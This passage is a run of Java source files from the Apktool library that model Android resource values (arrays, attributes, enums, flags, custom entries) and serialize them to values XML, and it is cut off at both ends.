 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.table.value;

import brut.androlib.exceptions.AndrolibException;
import brut.androlib.res.table.ResEntry;
import brut.androlib.res.table.ResEntrySpec;
import org.xmlpull.v1.XmlSerializer;

import java.io.IOException;
import java.util.Arrays;

public class ResArray extends ResBag {
    private final ResItem[] mItems;

    public ResArray(ResReference parent, ResItem[] items) {
        super(parent);
        assert items != null;
        mItems = items;
    }

    public static ResArray parse(ResReference parent, RawItem[] rawItems) {
        ResItem[] items = new ResItem[rawItems.length];

        for (int i = 0; i < rawItems.length; i++) {
            items[i] = rawItems[i].getValue();
        }

        return new ResArray(parent, items);
    }

    @Override
    public void serializeToValuesXml(XmlSerializer serial, ResEntry entry) throws AndrolibException, IOException {
        String format = resolveFormat();

        // It's safe to use the format as the array type since the only typed arrays are string-array and integer-array.
        String tagName = "array";
        if (format != null) {
            switch (format) {
                case "string":
                case "integer":
                    tagName = format + "-" + tagName;
                    break;
            }
        }

        serial.startTag(null, tagName);
        serial.attribute(null, "name", entry.getName());

        for (ResItem value : mItems) {
            serial.startTag(null, "item");
            serial.text(value.toXmlTextValue());
            serial.endTag(null, "item");
        }

        serial.endTag(null, tagName);
    }

    private String resolveFormat() {
        String format = null;

        for (ResItem value : mItems) {
            String itemFormat = null;

            if (value instanceof ResReference) {
                // The reference format is ambiguous. Since the only typed arrays are string-array and integer-array,
                // we can infer a more specific format from the type of the referenced entry spec without mapping it
                // explicitly to a format.
                try {
                    ResEntrySpec spec = ((ResReference) value).resolve();
                    if (spec != null) {
                        itemFormat = spec.getTypeSpec().getName();
                    }
                } catch (AndrolibException ignored) {
                }
            } else {
                itemFormat = value.getFormat();
            }

            // Ignore @null and @empty.
            if (itemFormat == null) {
                continue;
            }

            if (format == null) {
                format = itemFormat;
            } else if (!format.equals(itemFormat)) {
                // Items with differing formats imply the array is generic.
                format = null;
                break;
            }
        }

        return format;
    }

    @Override
    public String toString() {
        return String.format("ResArray{items=%s}", Arrays.toString(mItems));
    }

    @Override
    public boolean equals(Object obj) {
        if (obj == this) {
            return true;
        }
        if (obj instanceof ResArray) {
            ResArray other = (ResArray) obj;
            return Arrays.equals(mItems, other.mItems);
        }
        return false;
    }

    @Override
    public int hashCode() {
        return Arrays.hashCode(mItems);
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/table/value/ResAttribute.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.table.value;

import brut.androlib.exceptions.AndrolibException;
import brut.androlib.res.table.ResEntry;
import brut.androlib.res.table.ResId;
import brut.androlib.res.table.ResPackage;
import brut.androlib.res.xml.ResStringEncoder;
import brut.common.Log;
import org.xmlpull.v1.XmlSerializer;

import java.io.IOException;
import java.util.Objects;

public class ResAttribute extends ResBag {
    private static final String TAG = ResAttribute.class.getName();

    private static final int ATTR_TYPE = 0x01000000;
    private static final int ATTR_MIN = 0x01000001;
    private static final int ATTR_MAX = 0x01000002;
    private static final int ATTR_L10N = 0x01000003;

    public static final int ATTR_TYPE_ANY = 0x0000FFFF;
    public static final int ATTR_TYPE_REFERENCE = 1 << 0; // 0x01
    public static final int ATTR_TYPE_STRING = 1 << 1; // 0x02
    public static final int ATTR_TYPE_INTEGER = 1 << 2; // 0x04
    public static final int ATTR_TYPE_BOOLEAN = 1 << 3; // 0x08
    public static final int ATTR_TYPE_COLOR = 1 << 4; // 0x10
    public static final int ATTR_TYPE_FLOAT = 1 << 5; // 0x20
    public static final int ATTR_TYPE_DIMENSION = 1 << 6; // 0x40
    public static final int ATTR_TYPE_FRACTION = 1 << 7; // 0x80
    public static final int ATTR_TYPE_ENUM = 1 << 16; // 0x00010000
    public static final int ATTR_TYPE_FLAGS = 1 << 17; // 0x00020000

    private static final int[] ATTR_TYPE_MASKS = {
        ATTR_TYPE_STRING, ATTR_TYPE_INTEGER, ATTR_TYPE_BOOLEAN, ATTR_TYPE_COLOR, ATTR_TYPE_FLOAT,
        ATTR_TYPE_DIMENSION, ATTR_TYPE_FRACTION, ATTR_TYPE_REFERENCE
    };
    private static final String[] ATTR_TYPE_NAMES = {
        "string", "integer", "boolean", "color", "float", "dimension", "fraction", "reference"
    };

    private static final int ATTR_L10N_NOT_REQUIRED = 0;
    private static final int ATTR_L10N_SUGGESTED = 1;

    public static final ResAttribute DEFAULT = new ResAttribute(
        null, ATTR_TYPE_ANY, Integer.MIN_VALUE, Integer.MAX_VALUE, ATTR_L10N_NOT_REQUIRED);

    protected int mType; // might be updated later
    protected final int mMin;
    protected final int mMax;
    protected final int mL10n;

    public ResAttribute(ResReference parent, int type, int min, int max, int l10n) {
        super(parent);
        mType = type;
        mMin = min;
        mMax = max;
        mL10n = l10n;
    }

    public static ResAttribute parse(ResReference parent, RawItem[] rawItems) {
        int type = ATTR_TYPE_ANY;
        int min = Integer.MIN_VALUE;
        int max = Integer.MAX_VALUE;
        int l10n = ATTR_L10N_NOT_REQUIRED;

        int i = 0, n = rawItems.length;
        for (; i < n; i++) {
            RawItem rawItem = rawItems[i];
            ResPrimitive value = (ResPrimitive) rawItem.getValue();

            switch (rawItem.getKey()) {
                case ATTR_TYPE:
                    type = value.getData();
                    continue;
                case ATTR_MIN:
                    min = value.getData();
                    continue;
                case ATTR_MAX:
                    max = value.getData();
                    continue;
                case ATTR_L10N:
                    l10n = value.getData();
                    continue;
            }
            break;
        }
        if (i == n) {
            // The attribute doesn't have any symbols.
            return new ResAttribute(parent, type, min, max, l10n);
        }

        Symbol[] symbols = new Symbol[n - i];
        ResPackage pkg = parent.getPackage();

        for (int j = 0; i < n; i++, j++) {
            RawItem rawItem = rawItems[i];
            // The name of the symbol as a reference to a generated ID resource value.
            int nameId = rawItem.getKey();
            ResReference name = new ResReference(pkg, ResId.of(nameId));
            ResPrimitive value = (ResPrimitive) rawItem.getValue();

            symbols[j] = new Symbol(name, value);
        }

        if ((type & ATTR_TYPE_ENUM) != 0) {
            return new ResEnum(parent, type, min, max, l10n, symbols);
        } else if ((type & ATTR_TYPE_FLAGS) != 0) {
            return new ResFlags(parent, type, min, max, l10n, symbols);
        } else {
            Log.w(TAG, "Invalid attribute type: 0x%08x", type);
            return new ResAttribute(parent, type, min, max, l10n);
        }
    }

    public static class Symbol {
        private final ResReference mKey;
        private final ResPrimitive mValue;

        public Symbol(ResReference key, ResPrimitive value) {
            assert key != null && value != null;
            mKey = key;
            mValue = value;
        }

        public ResReference getKey() {
            return mKey;
        }

        public ResPrimitive getValue() {
            return mValue;
        }
    }

    public void addValueType(int valueType) {
        if ((mType & ATTR_TYPE_ANY) == ATTR_TYPE_ANY) {
            return;
        }
        switch (valueType) {
            case TYPE_NULL:
            case TYPE_REFERENCE:
            case TYPE_DYNAMIC_REFERENCE:
            case TYPE_ATTRIBUTE:
            case TYPE_DYNAMIC_ATTRIBUTE:
                mType |= ATTR_TYPE_REFERENCE;
                return;
            case TYPE_STRING:
                mType |= ATTR_TYPE_STRING;
                return;
            case TYPE_FLOAT:
                mType |= ATTR_TYPE_FLOAT;
                return;
            case TYPE_DIMENSION:
                mType |= ATTR_TYPE_DIMENSION;
                return;
            case TYPE_FRACTION:
                mType |= ATTR_TYPE_FRACTION;
                return;
            case TYPE_INT_BOOLEAN:
                mType |= ATTR_TYPE_BOOLEAN;
                return;
            default:
                if (valueType >= TYPE_FIRST_COLOR_INT && valueType <= TYPE_LAST_COLOR_INT) {
                    mType |= ATTR_TYPE_COLOR;
                } else if (valueType >= TYPE_FIRST_INT && valueType <= TYPE_LAST_INT) {
                    mType |= ATTR_TYPE_INTEGER;
                }
                return;
        }
    }

    public boolean hasSymbolsForValue(ResItem value) {
        return getSymbolsForValue(value) != null;
    }

    protected Symbol[] getSymbolsForValue(ResItem value) {
        // Stub for attribute types with symbols.
        return null;
    }

    public String formatAsTextValue(ResItem value) throws AndrolibException {
        return formatValue(value, false);
    }

    public String formatAsAttributeValue(ResItem value) throws AndrolibException {
        return formatValue(value, true);
    }

    private String formatValue(ResItem value, boolean asAttrValue) throws AndrolibException {
        String formatted = formatValueFromSymbols(value);
        if (formatted != null) {
            return formatted;
        }

        // Ensure strings are escaped for attribute values according to the attribute type.
        if (asAttrValue && value instanceof ResString) {
            CharSequence strValue = ((ResString) value).getValue();
            return ResStringEncoder.encodeAttributeValue(strValue, mType);
        }

        return asAttrValue ? value.toXmlAttributeValue() : value.toXmlTextValue();
    }

    protected String formatValueFromSymbols(ResItem value) throws AndrolibException {
        // Stub for attribute types with symbols.
        return null;
    }

    @Override
    public void serializeToValuesXml(XmlSerializer serial, ResEntry entry) throws AndrolibException, IOException {
        String tagName = "attr";
        serial.startTag(null, tagName);
        serial.attribute(null, "name", entry.getName());
        String format = renderFormat();
        if (format != null) {
            serial.attribute(null, "format", format);
        }
        if (mMin != Integer.MIN_VALUE) {
            serial.attribute(null, "min", Integer.toString(mMin));
        }
        if (mMax != Integer.MAX_VALUE) {
            serial.attribute(null, "max", Integer.toString(mMax));
        }
        if (mL10n == ATTR_L10N_SUGGESTED) {
            serial.attribute(null, "localization", "suggested");
        }
        serializeSymbolsToValuesXml(serial, entry);
        serial.endTag(null, tagName);
    }

    private String renderFormat() {
        if ((mType & ATTR_TYPE_ANY) == ATTR_TYPE_ANY) {
            return null;
        }
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < ATTR_TYPE_MASKS.length; i++) {
            if ((mType & ATTR_TYPE_MASKS[i]) != 0) {
                if (sb.length() > 0) {
                    sb.append('|');
                }
                sb.append(ATTR_TYPE_NAMES[i]);
            }
        }
        if (sb.length() == 0) {
            return null;
        }
        return sb.toString();
    }

    protected void serializeSymbolsToValuesXml(XmlSerializer serial, ResEntry entry)
            throws AndrolibException, IOException {
        // Stub for attribute types with symbols.
    }

    @Override
    public String toString() {
        return String.format("ResAttribute{type=0x%04x, min=%s, max=%s, l10n=%s}", mType, mMin, mMax, mL10n);
    }

    @Override
    public boolean equals(Object obj) {
        if (obj == this) {
            return true;
        }
        if (obj instanceof ResAttribute) {
            ResAttribute other = (ResAttribute) obj;
            return mType == other.mType
                && mMin == other.mMin
                && mMax == other.mMax
                && mL10n == other.mL10n;
        }
        return false;
    }

    @Override
    public int hashCode() {
        return Objects.hash(mType, mMin, mMax, mL10n);
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/table/value/ResBag.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.table.value;

import brut.androlib.exceptions.AndrolibException;
import brut.androlib.res.xml.ValuesXmlSerializable;
import brut.common.Log;

public abstract class ResBag extends ResValue implements ValuesXmlSerializable {
    private static final String TAG = ResBag.class.getName();

    protected final ResReference mParent;

    protected ResBag(ResReference parent) {
        mParent = parent;
    }

    public static ResBag parse(String typeName, ResReference parent, RawItem[] rawItems) {
        switch (typeName) {
            case "attr":
            case "^attr-private":
                return ResAttribute.parse(parent, rawItems);
            case "array":
                return ResArray.parse(parent, rawItems);
            case "plurals":
                return ResPlural.parse(parent, rawItems);
            case "style":
                return ResStyle.parse(parent, rawItems);
            default:
                Log.w(TAG, "Unsupported type for bags: " + typeName);
                return null;
        }
    }

    public static class RawItem {
        private final int mKey;
        private final ResItem mValue;

        public RawItem(int key, ResItem value) {
            assert value != null;
            mKey = key;
            mValue = value;
        }

        public int getKey() {
            return mKey;
        }

        public ResItem getValue() {
            return mValue;
        }
    }

    public void resolveKeys() throws AndrolibException {
        // Stub for bags with resolvable keys.
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/table/value/ResCustom.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.table.value;

import brut.androlib.exceptions.AndrolibException;
import brut.androlib.res.table.ResEntry;
import brut.androlib.res.xml.ValuesXmlSerializable;
import org.xmlpull.v1.XmlSerializer;

import java.io.IOException;
import java.util.Objects;

public class ResCustom extends ResValue implements ValuesXmlSerializable {
    public static final ResCustom ID = new ResCustom("id");

    private final String mType;
    private final Object mValue;
    private final boolean mAsItem;

    public ResCustom(String type) {
        this(type, null, false);
    }

    public ResCustom(String type, boolean asItem) {
        this(type, null, asItem);
    }

    public ResCustom(String type, Object value) {
        this(type, value, false);
    }

    public ResCustom(String type, Object value, boolean asItem) {
        assert type != null;
        mType = type;
        mValue = value;
        mAsItem = asItem;
    }

    @Override
    public void serializeToValuesXml(XmlSerializer serial, ResEntry entry) throws AndrolibException, IOException {
        String tagName = mAsItem ? "item" : mType;
        serial.startTag(null, tagName);
        if (mAsItem) {
            serial.attribute(null, "type", mType);
        }
        serial.attribute(null, "name", entry.getName());
        if (mValue != null) {
            serial.text(mValue.toString());
        }
        serial.endTag(null, tagName);
    }

    @Override
    public String toString() {
        return String.format("ResCustom{type=%s, value=%s, asItem=%s}", mType, mValue, mAsItem);
    }

    @Override
    public boolean equals(Object obj) {
        if (obj == this) {
            return true;
        }
        if (obj instanceof ResCustom) {
            ResCustom other = (ResCustom) obj;
            return mType.equals(other.mType)
                && Objects.equals(mValue, other.mValue)
                && mAsItem == other.mAsItem;
        }
        return false;
    }

    @Override
    public int hashCode() {
        return Objects.hash(mType, mValue, mAsItem);
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/table/value/ResEnum.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.table.value;

import brut.androlib.exceptions.AndrolibException;
import brut.androlib.res.table.ResEntry;
import brut.androlib.res.table.ResEntrySpec;
import brut.androlib.res.table.ResId;
import brut.androlib.res.table.ResPackage;
import brut.common.Log;
import org.xmlpull.v1.XmlSerializer;

import java.io.IOException;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;
import java.util.Objects;

public class ResEnum extends ResAttribute {
    private static final String TAG = ResEnum.class.getName();

    private final Symbol[] mSymbols;
    private Map<Integer, Symbol[]> mSymbolsCache;
    private Map<Integer, String> mFormatsCache;

    public ResEnum(ResReference parent, int type, int min, int max, int l10n, Symbol[] symbols) {
        super(parent, type, min, max, l10n);
        assert parent != null && symbols != null;
        mSymbols = symbols;
    }

    @Override
    public void resolveKeys() throws AndrolibException {
        ResPackage pkg = mParent.getPackage();
        boolean skipUnresolved = pkg.getTable().getConfig().isDecodeResolveLazy();

        for (Symbol symbol : mSymbols) {
            ResReference key = symbol.getKey();
            if (key.resolve() != null) {
                continue;
            }

            ResId keyId = key.getResId();

            // #2836 - Skip item if the resource cannot be resolved.
            if (skipUnresolved || keyId.pkgId() != pkg.getId()) {
                Log.w(TAG, "Unresolved enum reference: key=%s, value=%s", key, symbol.getValue());
                continue;
            }

            pkg.addEntrySpec(keyId.typeId(), keyId.entryId(), ResEntrySpec.DUMMY_PREFIX + keyId);
            pkg.addEntry(keyId.typeId(), keyId.entryId(), ResCustom.ID);
        }
    }

    @Override
    protected Symbol[] getSymbolsForValue(ResItem value) {
        if (!isSymbolValueType(value)) {
            return null;
        }

        int data = ((ResPrimitive) value).getData();
        return getSymbols(data);
    }

    private boolean isSymbolValueType(ResItem value) {
        if (!(value instanceof ResPrimitive)) {
            return false;
        }

        int type = value.getType();
        return type == TYPE_INT_DEC || type == TYPE_INT_HEX;
    }

    private Symbol[] getSymbols(int data) {
        if (mSymbolsCache == null) {
            // Lazily establish a symbols cache for performance.
            mSymbolsCache = new HashMap<>();
        } else if (mSymbolsCache.containsKey(data)) {
            return mSymbolsCache.get(data);
        }

        Symbol[] symbols = new Symbol[mSymbols.length];
        int symbolsCount = 0;

        for (Symbol symbol : mSymbols) {
            if (symbol.getValue().getData() == data) {
                symbols[symbolsCount++] = symbol;
            }
        }

        if (symbolsCount == 0) {
            symbols = null;
        } else if (symbolsCount < symbols.length) {
            symbols = Arrays.copyOf(symbols, symbolsCount);
        }

        mSymbolsCache.put(data, symbols);
        return symbols;
    }

    @Override
    protected String formatValueFromSymbols(ResItem value) throws AndrolibException {
        if (!isSymbolValueType(value)) {
            return null;
        }

        int data = ((ResPrimitive) value).getData();
        if (mFormatsCache == null) {
            // Lazily establish a formats cache for performance.
            mFormatsCache = new HashMap<>();
        } else if (mFormatsCache.containsKey(data)) {
            return mFormatsCache.get(data);
        }

        Symbol[] symbols = getSymbols(data);
        String formatted = null;

        if (symbols != null) {
            for (Symbol symbol : symbols) {
                ResEntrySpec keySpec = symbol.getKey().resolve();
                if (keySpec == null) {
                    continue;
                }

                formatted = keySpec.getName();

                // fill_parent is deprecated since API 8 but appears first.
                // Keep looking for match_parent and use it instead if found.
                if (data == -1 && formatted.equals("fill_parent")) {
                    continue;
                }
                break;
            }
        }

        mFormatsCache.put(data, formatted);
        return formatted;
    }

    @Override
    protected void serializeSymbolsToValuesXml(XmlSerializer serial, ResEntry entry)
            throws AndrolibException, IOException {
        for (Symbol symbol : mSymbols) {
            ResEntrySpec keySpec = symbol.getKey().resolve();
            if (keySpec == null) {
                continue;
            }

            serial.startTag(null, "enum");
            serial.attribute(null, "name", keySpec.getName());
            serial.attribute(null, "value", symbol.getValue().toXmlAttributeValue());
            serial.endTag(null, "enum");
        }
    }

    @Override
    public String toString() {
        return String.format("ResEnum{parent=%s, type=0x%04x, min=%s, max=%s, l10n=%s, symbols=%s}",
            mParent, mType, mMin, mMax, mL10n, Arrays.toString(mSymbols));
    }

    @Override
    public boolean equals(Object obj) {
        if (obj == this) {
            return true;
        }
        if (obj instanceof ResEnum) {
            ResEnum other = (ResEnum) obj;
            return mParent.equals(other.mParent)
                && mType == other.mType
                && mMin == other.mMin
                && mMax == other.mMax
                && mL10n == other.mL10n
                && Arrays.equals(mSymbols, other.mSymbols);
        }
        return false;
    }

    @Override
    public int hashCode() {
        return Objects.hash(mParent, mType, mMin, mMax, mL10n, Arrays.hashCode(mSymbols));
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/table/value/ResFileReference.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.table.value;

public class ResFileReference extends ResValue {
    private final String mPath;

    public ResFileReference(String path) {
        assert path != null;
        mPath = path;
    }

    public String getPath() {
        return mPath;
    }

    @Override
    public String toString() {
        return String.format("ResFileReference{path=%s}", mPath);
    }

    @Override
    public boolean equals(Object obj) {
        if (obj == this) {
            return true;
        }
        if (obj instanceof ResFileReference) {
            ResFileReference other = (ResFileReference) obj;
            return mPath.equals(other.mPath);
        }
        return false;
    }

    @Override
    public int hashCode() {
        return mPath.hashCode();
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/table/value/ResFlags.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.table.value;

import brut.androlib.exceptions.AndrolibException;
import brut.androlib.res.table.ResEntry;
import brut.androlib.res.table.ResEntrySpec;
import brut.androlib.res.table.ResId;
import brut.androlib.res.table.ResPackage;
import brut.common.Log;
import org.xmlpull.v1.XmlSerializer;

import java.io.IOException;
import java.util.Arrays;
import java.util.Comparator;
import java.util.HashMap;
import java.util.Map;
import java.util.Objects;

public class ResFlags extends ResAttribute {
    private static final String TAG = ResFlags.class.getName();

    private final Symbol[] mSymbols;
    private Map<Integer, Symbol[]> mSymbolsCache;
    private Map<Integer, String> mFormatsCache;
    private Symbol[] mSortedSymbols;

    public ResFlags(ResReference parent, int type, int min, int max, int l10n, Symbol[] symbols) {
        super(parent, type, min, max, l10n);
        assert parent != null && symbols != null;
        mSymbols = symbols;
    }

    @Override
    public void resolveKeys() throws AndrolibException {
        ResPackage pkg = mParent.getPackage();
        boolean skipUnresolved = pkg.getTable().getConfig().isDecodeResolveLazy();

        for (Symbol symbol : mSymbols) {
            ResReference key = symbol.getKey();
            if (key.resolve() != null) {
                continue;
            }

            ResId keyId = key.getResId();

            // #2836 - Skip item if the resource cannot be resolved.
            if (skipUnresolved || keyId.pkgId() != pkg.getId()) {
                Log.w(TAG, "Unresolved flag reference: key=%s, value=%s", key, symbol.getValue());
                continue;
            }

            pkg.addEntrySpec(keyId.typeId(), keyId.entryId(), ResEntrySpec.DUMMY_PREFIX + keyId);
            pkg.addEntry(keyId.typeId(), keyId.entryId(), ResCustom.ID);
        }
    }

    @Override
    protected Symbol[] getSymbolsForValue(ResItem value) {
        if (!isSymbolValueType(value)) {
            return null;
        }

        int data = ((ResPrimitive) value).getData();
        return getSymbols(data);
    }

    private boolean isSymbolValueType(ResItem value) {
        if (!(value instanceof ResPrimitive)) {
            return false;
        }

        int type = value.getType();
        return type == TYPE_INT_DEC || type == TYPE_INT_HEX;
    }

    private Symbol[] getSymbols(int data) {
        if (mSymbolsCache == null) {
            // Lazily establish a symbols cache for performance.
            mSymbolsCache = new HashMap<>();
        } else if (mSymbolsCache.containsKey(data)) {
            return mSymbolsCache.get(data);
        }

        if (mSortedSymbols == null) {
            // Lazily establish a priority list for the flags.
            // This can never be completely accurate to the source, but it's a best-effort approach.
            mSortedSymbols = mSymbols.clone();
            Comparator<Symbol> byBitCount = Comparator.comparingInt(
                (Symbol symbol) -> Integer.bitCount(symbol.getValue().getData()));
            Comparator<Symbol> byRawValue = Comparator.comparingInt(
                (Symbol symbol) -> symbol.getValue().getData());
            Arrays.sort(mSortedSymbols, byBitCount.reversed().thenComparing(byRawValue));
        }

        Symbol[] symbols = new Symbol[mSortedSymbols.length];
        int symbolsCount = 0;

        if (data == 0) {
            for (Symbol symbol : mSortedSymbols) {
                if (symbol.getValue().getData() == 0) {
                    symbols[symbolsCount++] = symbol;
                }
            }
        } else {
            int mask = 0;

            for (Symbol symbol : mSortedSymbols) {
                int flag = symbol.getValue().getData();
                if ((data & flag) != flag || (mask & flag) == flag) {
                    continue;
                }

                symbols[symbolsCount++] = symbol;
                mask |= flag;

                if (mask == data) {
                    break;
                }
            }

            // Filter out redundant flags.
            if (symbolsCount > 2) {
                Symbol[] filtered = new Symbol[symbolsCount];
                int filteredCount = 0;

                for (int i = 0; i < symbolsCount; i++) {
                    Symbol symbol = symbols[i];
                    mask = 0;

                    // Combine the other flags.
                    for (int j = 0; j < symbolsCount; j++) {
                        Symbol other = symbols[j];

                        if (j != i) {
                            mask |= other.getValue().getData();
                        }
                    }

                    // Skip if it doesn't add at least one unique bit.
                    if ((symbol.getValue().getData() & ~mask) == 0) {
                        continue;
                    }

                    filtered[filteredCount++] = symbol;
                }

                symbols = filtered;
                symbolsCount = filteredCount;
            }
        }

        if (symbolsCount == 0) {
            symbols = null;
        } else if (symbolsCount < symbols.length) {
            symbols = Arrays.copyOf(symbols, symbolsCount);
        }

        mSymbolsCache.put(data, symbols);
        return symbols;
    }

    @Override
    protected String formatValueFromSymbols(ResItem value) throws AndrolibException {
        if (!isSymbolValueType(value)) {
            return null;
        }

        int data = ((ResPrimitive) value).getData();
        if (mFormatsCache == null) {
            // Lazily establish a formats cache for performance.
            mFormatsCache = new HashMap<>();
        } else if (mFormatsCache.containsKey(data)) {
            return mFormatsCache.get(data);
        }

        Symbol[] symbols = getSymbols(data);
        String formatted = null;

        if (symbols != null) {
            StringBuilder sb = new StringBuilder();

            for (Symbol symbol : symbols) {
                ResEntrySpec keySpec = symbol.getKey().resolve();
                if (keySpec == null) {
                    continue;
                }

                if (sb.length() > 0) {
                    sb.append('|');
                }
                sb.append(keySpec.getName());
            }

            formatted = sb.toString();
        }

        mFormatsCache.put(data, formatted);
        return formatted;
    }

    @Override
    protected void serializeSymbolsToValuesXml(XmlSerializer serial, ResEntry entry)
            throws AndrolibException, IOException {
        for (Symbol symbol : mSymbols) {
            ResEntrySpec keySpec = symbol.getKey().resolve();
            if (keySpec == null) {
                continue;
            }

            serial.startTag(null, "flag");
            serial.attribute(null, "name", keySpec.getName());
            serial.attribute(null, "value", symbol.getValue().toXmlAttributeValue());
            serial.endTag(null, "flag");
        }
    }

    @Override
    public String toString() {
        return String.format("ResFlags{parent=%s, type=0x%04x, min=%s, max=%s, l10n=%s, symbols=%s}",
            mParent, mType, mMin, mMax, mL10n, Arrays.toString(mSymbols));
    }

    @Override
    public boolean equals(Object obj) {
        if (obj == this) {
            return true;
        }
        if (obj instanceof ResFlags) {
            ResFlags other = (ResFlags) obj;
            return mParent.equals(other.mParent)
                && mType == other.mType
                && mMin == other.mMin
                && mMax == other.mMax
                && mL10n == other.mL10n
                && Arrays.equals(mSymbols, other.mSymbols);
        }
        return false;
    }

    @Override
    public int hashCode() {
        return Objects.hash(mParent, mType, mMin, mMax, mL10n, Arrays.hashCode(mSymbols));
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/table/value/ResItem.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.table.value;

import brut.androlib.exceptions.AndrolibException;
import brut.androlib.res.table.ResId;
import brut.androlib.res.table.ResPackage;
import brut.androlib.res.xml.ValuesXmlSerializable;
import brut.common.Log;
import com.google.common.collect.Sets;

import java.util.HashMap;
import java.util.Map;
import java.util.Set;

public abstract class ResItem extends ResValue implements ValuesXmlSerializable {
    private static final String TAG = ResItem.class.getName();

    protected static final Map<String, Set<String>> STANDARD_TYPE_FORMATS = new HashMap<>();
    static {
        STANDARD_TYPE_FORMATS.put("bool", Sets.newHashSet("boolean"));
        STANDARD_TYPE_FORMATS.put("color", Sets.newHashSet("color"));
        STANDARD_TYPE_FORMATS.put("dimen", Sets.newHashSet("float", "fraction", "dimension"));
        STANDARD_TYPE_FORMATS.put("drawable", Sets.newHashSet("color"));
        STANDARD_TYPE_FORMATS.put("fraction", Sets.newHashSet("float", "fraction", "dimension"));
        STANDARD_TYPE_FORMATS.put("integer", Sets.newHashSet("integer"));
        STANDARD_TYPE_FORMATS.put("string", Sets.newHashSet("string"));
    }

    protected final int mType;

    protected ResItem(int type) {
        mType = type;
    }

    public static ResItem parse(ResPackage pkg, int type, int data) {
        assert type != TYPE_STRING;
        switch (type) {
            case TYPE_NULL:
                return data == DATA_NULL_EMPTY ? ResPrimitive.EMPTY : ResPrimitive.NULL;
            case TYPE_REFERENCE:
